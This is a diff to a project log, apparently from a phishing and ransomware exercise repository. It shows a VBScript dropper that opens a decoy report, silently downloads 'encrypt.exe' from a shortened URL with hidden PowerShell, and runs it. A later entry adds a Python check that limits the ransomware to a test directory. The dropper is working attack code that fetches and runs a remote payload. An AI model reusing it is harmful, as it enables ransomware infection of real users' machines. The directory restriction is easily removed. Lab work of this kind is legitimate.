@@ -294,14 +294,35 @@ openRaport = "cmd /c start """" %TEMP%\BIGraport.txt"
 objShell.Run openRaport, 0, True
 
 ' Download the executable from attacker ip or other source
-downloadCmd = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/36xacafn', '%TEMP%\encrypt.exe')"""
+downloadCmd = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/28sb6pvc', '%TEMP%\encrypt.exe')"""
 objShell.Run downloadCmd, 0, True
 
 ' Start the exe in working directory defined below
-execCmd = "cmd /c powershell -WindowStyle Hidden -Command ""Start-Process \""%TEMP%\encrypt.exe\"" -WorkingDirectory \""$env:UserProfile\Documents\"""""
+execCmd = "cmd /c powershell -WindowStyle Hidden -Command ""Start-Process \""%TEMP%\encrypt.exe\"" -WorkingDirectory \""$env:UserProfile\TestDirz338\"""""
 objShell.Run execCmd, 0, True
 
 Set objShell = Nothing
 ```
+### 5.12.2024
 
+Fixing and tuning the ransomware program to only work in a specific given unique directory called TestDirz338. Reason for this change is that we want everybody to be extremely safe when doing encryption excercises. 
+
+I added these lines to the program:
+
+```
+#check if launched from within "TestDirz338" directory
+
+current_directory = os.path.basename(os.getcwd())
+if current_directory != "TestDirz338":
+    #display an error message box if its not ran from 'TestDirz338' directory
+    messagebox.showerror("Error", "Please launch the script from within the 'TestDirz338' directory.")
+    sys.exit()
+```
+If the program is launched from elsewhere, an error raises:
+
+![2023-12-05_18-56](https://github.com/therealhalonen/PhishSticks/assets/112076418/1d0c9d31-ecf2-407b-92a3-928b3a7c7e08)
+
+I also added some angry and happy phishsticks (made by [sawulohi](https://github.com/sawulohi/)) to give some life to the UI.
+
+![2023-12-05_19-18](https://github.com/therealhalonen/PhishSticks/assets/112076418/a6b82c99-8dbb-4ed1-8394-93b5faaac0d2)
 
